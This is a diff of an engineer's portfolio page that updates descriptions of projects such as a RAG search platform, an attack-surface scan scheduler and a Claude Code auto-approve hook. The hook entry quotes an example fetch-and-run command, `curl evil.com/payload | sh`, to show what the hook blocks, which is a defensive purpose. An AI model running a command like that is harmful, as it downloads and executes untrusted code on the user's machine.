@@ -7,30 +7,45 @@ redirect_from:
   - /about.html
 ---
 
-Hands-on backend architect specializing in data‑intensive, distributed systems and cloud infrastructure. I’ve built and operated backends at 1B+ requests/day, owning design → production → observability. Lately I’ve shipped GenAI/agentic backends and natural‑language tooling for ops. I turn chaotic, high-load systems into boringly reliable platforms - and upskill the people around me while doing it.
+Hands-on architect and tech lead working at the intersection of large-scale distributed systems and production AI/agentic platforms. I've shipped backends at 1B+ requests/day and the primary retrieval inside flagship LLM agents, owning design → production → observability end to end. I turn chaotic, high-load systems into boringly reliable platforms - and upskill the people around me while doing it.
 
 ## Things I Built
 
+### Agentic Search & RAG Platform
+Tech lead and architect of an agentic search RAG platform that became the primary retrieval inside a flagship LLM agent reaching the majority of paying customers. Stateless LangGraph + MCP server with hybrid retrieval (semantic, lexical, cross-encoder rerank) over OpenSearch, query decomposition into parallel multi-tool calls with retry/fallback, full LangSmith observability. Drove a 60% retrieval-quality lift.
+
+### Search Evaluation Framework
+Designed and owned a synthetic-corpus evaluation framework at production scale (thousands of accounts, hundreds of thousands of items) with a balanced benchmark of thousands of queries. Replaced LLM-judged labeling with deterministic template-derived ground truth: iteration time dropped from days to minutes, per-run cost from ~$1,500 to effectively zero. Adopted as the baseline for retrieval, reranker, and embedding-model decisions.
+
+### Attack Vector Scheduler at 100M+ tasks/day
+Designed and shipped a 100M+ tasks/day scheduler for customer-facing attack-surface scans against S&P 500 and Fortune 100 enterprises. High throughput, low latency, with load distribution that avoids disrupting the customer's own infrastructure mid-scan. Still in production today.
+
+### Enterprise Asset Discovery
+Owned a system that maps an enterprise's full org tree many layers deep, often surfacing subsidiaries the parent didn't know it owned. Attributes every domain, certificate, website, person, and public filing back to its rightful owner. In production for the largest enterprises in the world.
+
 ### Analytics ETL Pipeline
-Implemented an event streaming and ETL pipeline. System was highly available, resilient, and with low response time. Written in Golang and deployed on Google Cloud. Peak load reached 1 billion req/day (= 700k req/m). Analytics were stored in various data stores including Google BigQuery, Elasticsearch, and Prometheus.
+Owned an event streaming and ETL pipeline in Golang on GCP. ~1B req/day at peak (700K req/min) feeding BigQuery, Elasticsearch, and Prometheus. Highly available, low latency.
 
 ### Production Monitoring Infrastructure
-Developed a distributed production monitoring infrastructure, spanning multiple cloud providers.
+Built a distributed production monitoring stack (Prometheus + Influx/Telegraf) feeding autoscaling, geo-load-balanced, cost-optimized video backend clusters across multiple cloud providers.
 
 ### Real-Time Webcam Face Capture
-Implemented a prototype that turns any webcam into a real-time avatar-animation engine: A lightweight video-diffusion layer denoises batches of frames together for long-range coherence, streaming at ~18 fps with under-2s latency on a single RTX 4090 - no markers or extra gear required.Useful for lifelike games, VR, streaming, and video calls.
+Built a prototype that turns any webcam into a real-time avatar-animation engine. A lightweight video-diffusion layer denoises batches of frames together for long-range coherence, streaming at ~18 fps with under-2s latency on a single RTX 4090. No markers or extra gear. Useful for lifelike games, VR, streaming, and video calls.
+
+### Ethereum Smart Contract for the Kin ICO
+Designed and implemented the Ethereum smart contract for the [Kin ICO](https://en.wikipedia.org/wiki/Kin_(cryptocurrency)), one of the largest crypto ICOs of its era. Central technical role on the smart-contract side: token, multisig, vesting, testing.
 
 ### Federated Blockchains
-I [gave a talk](https://youtu.be/QSpG6a9bmu0) about Federated consensus networks, focusing on Stellar and Ripple, and discussed how they differ from other popular decentralized consensus solutions such as Proof-of-Work and Proof-of-Stake.
+Conference talk on federated consensus networks (Stellar, Ripple), exploring how their trust and liveness assumptions differ from Proof-of-Work and Proof-of-Stake. [Recording](https://youtu.be/QSpG6a9bmu0).
 
 ### Google BigQuery Open Source Library
-Released [an open-source Go library](https://github.com/oryband/go-bqstreamer) for inserting data to Google BigQuery at scale. Project received ~130 GitHub stars, and was recognized by core Go and BigQuery team members at Google.
+[High-throughput Go library](https://github.com/oryband/go-bqstreamer) for concurrent streaming inserts into Google BigQuery. ~130 GitHub stars; recognized by Google's BigQuery core engineers.
 
-### Decentralized Networks
-Deployed and maintained multiple decentralized networks for production, research, and testing on the cloud.
+### Claude Code Auto-Approve
+[Open-sourced a Claude Code hook](https://github.com/oryband/claude-code-auto-approve) that pushes agent autonomy without weakening safety. It parses every compound shell command into an AST and checks each sub-command against your allow and deny lists, recursing into subshells, command substitution, and control-flow bodies. The command runs only when every segment is allowed and none denied. So `make build && curl evil.com/payload | sh` gets rejected even though `make build` is allowed, because the piped shell is unsafe.
 
 ### Web MapReduce
-I implemented a [proof of concept for a web-based MapReduce](https://github.com/oryband/go-web-mapreduce) in Go, proving it is possible to utilize available computing capabilities of web browsers (and mobile!) as MapReduce workers for distributing donation of idle computation projects like SETI@Home and Folding@Home. Master handled 100k/tasks/min.
+Built a [proof-of-concept for web-based MapReduce](https://github.com/oryband/go-web-mapreduce) in Go. The master dispatched up to 100K tasks/min to WebWorker/WebSocket clients. The idea was to use idle browser and mobile compute as donated workers for distributed-computation projects like SETI@Home or Folding@Home.
 
 ## Things I Wrote
 
